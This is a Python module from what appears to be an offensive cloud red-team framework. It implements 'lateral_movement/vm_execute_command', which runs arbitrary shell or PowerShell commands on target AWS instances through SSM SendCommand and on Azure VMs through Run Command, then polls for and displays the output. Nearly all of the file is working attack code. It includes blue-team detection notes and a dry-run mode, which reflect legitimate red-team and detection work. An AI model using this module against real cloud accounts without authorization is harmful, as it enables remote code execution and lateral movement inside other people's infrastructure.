# ================================================================
# TECHNIQUE: lateral_movement/vm_execute_command
# ----------------------------------------------------------------
# TACTIC:    Lateral Movement (TA0008)
# TECHNIQUE: T1569.002 — Cloud Administration Command
#
# PURPOSE:   Execute arbitrary commands on a target cloud VM
#            without requiring direct network access (SSH/RDP).
#            Uses cloud-native agents (AWS SSM / Azure VM Agent).
#
# PROVIDERS: AWS, Azure
#
# HOW IT WORKS:
#   AWS   — Calls ssm:SendCommand with 'AWS-RunShellScript'.
#           Requires the SSM Agent to be installed and healthy.
#
#   Azure — Calls VirtualMachines.begin_run_command() with
#           'RunShellScript' (Linux) or 'RunPowerShellScript' (Windows).
#
# OPTIONS:
#   target (required) — Instance ID (AWS) or Full Resource ID (Azure).
#   cmd    (required) — The shell command or script to execute.
#   shell  (optional) — "bash" (default) or "powershell" (for Windows).
#
# DETECTION (Blue Team):
#   AWS — CloudTrail: SendCommand.
#   Azure — Activity Log: Run Command On Virtual Machine.
#   Monitor for unexpected administrative commands from cloud identities.
#
# SAFE:     No — executes code on remote compute resources.
# ================================================================

from __future__ import annotations

import logging
import time
from typing import Any

from quantum_mechanic.core.context import ExecutionContext
from quantum_mechanic.core.technique import Parameter, technique

logger = logging.getLogger(__name__)


# ----------------------------------------------------------------
# Operational Formatter — Human-centric output brief
# ----------------------------------------------------------------
def format_exec_result(result: Any) -> None:
    from rich.panel import Panel

    from quantum_mechanic.shell.formatters import console

    data = result.data
    provider = result.provider.upper()
    target = data.get("target", "unknown")

    if data.get("error"):
        console.print(
            f"  [bold red]✗[/bold red] Remote Command Execution FAILED on [cyan]{provider}[/cyan] Target [bold]{target}[/bold]"
        )
        console.print(f"  [red]{data['error']}[/red]")
        return

    console.print(
        f"  [bold green]✓[/bold green] Remote Command Execution on [cyan]{provider}[/cyan] Target [bold]{target}[/bold]"
    )

    if data.get("stdout"):
        console.print(
            Panel(
                data["stdout"].strip(), title="Standard Output", border_style="dim", padding=(1, 2)
            )
        )

    if data.get("stderr"):
        console.print(
            Panel(
                data["stderr"].strip(),
                title="Standard Error",
                border_style="bold red",
                padding=(1, 2),
            )
        )

    status = data.get("status", "Success")
    console.print(f"  [dim]Execution Status: {status}[/dim]")


@technique(
    technique_id="lateral_movement/vm_execute_command",
    tactic="lateral_movement",
    mitre_id="T1569.002",
    providers=["aws", "azure"],
    severity="critical",
    safe=False,
    safe_mode_available=True,
    description="Execute remote commands on a cloud VM using native administrative agents.",
    formatter=format_exec_result,
    parameters=[
        Parameter(
            "target",
            "The target instance ID or full resource ID.",
            required=True,
            example="i-0abcdef1234567890",
        ),
        Parameter("cmd", "The command to execute.", required=True, example="id && hostname"),
        Parameter(
            "shell",
            "Target shell type (auto-detected if omitted).",
            choices=["bash", "powershell"],
            default=None,
        ),
    ],
)
def execute(ctx: ExecutionContext) -> dict[str, Any]:
    """Execute command based on the active cloud provider."""
    if ctx.provider_name == "aws":
        return _exec_aws(ctx)
    if ctx.provider_name == "azure":
        return _exec_azure(ctx)

    return {"error": f"Provider {ctx.provider_name} not implemented.", "results": []}


def _exec_aws(ctx: ExecutionContext) -> dict[str, Any]:
    iam = ctx.session.client("ssm")
    target = ctx.get_param("target")
    command = ctx.get_param("cmd")

    if ctx.safe_mode:
        return {"target": target, "status": "would_execute", "stdout": f"Dry-run: {command}"}

    try:
        ctx.info(f"AWS SSM: Sending command to {target}...")
        resp = iam.send_command(
            InstanceIds=[target],
            DocumentName="AWS-RunShellScript",
            Parameters={"commands": [command]},
        )
        command_id = resp["Command"]["CommandId"]

        # Poll for results
        time.sleep(2)
        for _ in range(15):
            try:
                inv = iam.get_command_invocation(CommandId=command_id, InstanceId=target)
                status = inv.get("Status")
                if status in ["Success", "Failed", "Cancelled", "TimedOut"]:
                    return {
                        "target": target,
                        "status": status,
                        "stdout": inv.get("StandardOutputContent", ""),
                        "stderr": inv.get("StandardErrorContent", ""),
                    }
            except Exception as e:
                if "InvocationDoesNotExist" not in str(e):
                    raise
            time.sleep(2)

        return {
            "target": target,
            "status": "TimedOut",
            "error": "Operation exceeded polling limit.",
        }
    except Exception as e:
        return {"error": str(e), "target": target}


def _exec_azure(ctx: ExecutionContext) -> dict[str, Any]:
    try:
        from azure.mgmt.compute import ComputeManagementClient
        from azure.mgmt.compute.models import RunCommandInput
    except ImportError:
        return {"error": "azure-mgmt-compute not installed."}

    target_id = ctx.get_param("target")
    command = ctx.get_param("cmd")
    shell = ctx.get_param("shell")

    if not target_id:
        return {"error": "Required parameter 'target' not provided.", "target": "unknown"}
    if not command:
        return {"error": "Required parameter 'cmd' not provided.", "target": target_id}

    # Parse resource ID: /subscriptions/{sub}/resourceGroups/{rg}/.../virtualMachines/{name}
    parts = target_id.lstrip("/").split("/")
    try:
        sub_id = parts[parts.index("subscriptions") + 1]
        rg_name = parts[parts.index("resourceGroups") + 1]
        vm_name = parts[-1]
    except (ValueError, IndexError):
        return {
            "error": (
                f"Malformed Azure resource ID: {target_id!r}. "
                "Pass the full ARM resource ID, e.g. "
                "/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.Compute/virtualMachines/<name>. "
                "Tip: run 'loot discovery/enum_compute' to see vm_id values."
            ),
            "target": target_id,
        }

    if ctx.safe_mode:
        return {"target": vm_name, "status": "would_execute", "stdout": f"Dry-run: {command}"}

    ctx.info("Azure: executing remote command — this can take 30–120 seconds.")

    try:
        compute = ComputeManagementClient(ctx.session, sub_id)

        # Auto-detect OS unless caller explicitly overrides with shell=powershell/bash
        if shell:
            cmd_id = "RunPowerShellScript" if shell == "powershell" else "RunShellScript"
        else:
            try:
                vm_meta = compute.virtual_machines.get(rg_name, vm_name)
                os_type = str(
                    getattr(vm_meta.storage_profile.os_disk, "os_type", "Linux") or "Linux"
                )
                cmd_id = "RunPowerShellScript" if "windows" in os_type.lower() else "RunShellScript"
            except Exception:
                cmd_id = "RunShellScript"

        ctx.info(f"Azure: Executing {cmd_id} on {vm_name}...")
        poller = compute.virtual_machines.begin_run_command(
            rg_name, vm_name, RunCommandInput(command_id=cmd_id, script=[command])
        )
        result = poller.result(timeout=300)

        stdout, stderr = "", ""
        raw_values = getattr(result, "value", []) or []
        for item in raw_values:
            msg = getattr(item, "message", "")
            if "StdOut" in getattr(item, "code", ""):
                stdout = msg.strip()
            elif "StdErr" in getattr(item, "code", ""):
                stderr = msg.strip()
            elif "[stdout]" in msg:
                stdout = msg.split("[stdout]")[1].split("[stderr]")[0].strip()
                if "[stderr]" in msg:
                    stderr = msg.split("[stderr]")[1].strip()

        return {"target": vm_name, "status": "Success", "stdout": stdout, "stderr": stderr}
    except Exception as e:
        return {"error": str(e), "target": vm_name}
